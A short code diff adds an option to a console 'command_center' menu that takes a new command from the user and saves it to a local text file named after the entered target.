@@ -23,9 +23,12 @@ void command_center() {
 		Console.Write("\n");
 	}
 	
-	void change_command() {
+	void change_command(string target) {
 		Console.Write("Enter new command: ");
 		string new_command = Console.ReadLine();
+		string full_path = $"{target}/{target}.txt";
+		File.WriteAllText(full_path, new_command);
+		Console.WriteLine("\nCommand has been successfully set");
 	}
 	Console.Write("Enter target's name: ");
 	string target_name = Console.ReadLine();
@@ -42,6 +45,8 @@ void command_center() {
 		command_center_flag = 1;
 	} else if (opn == "1") {
 		view_command(target_name);
+	} else if (opn == "2") {
+		change_command(target_name);
 	}
 }
 
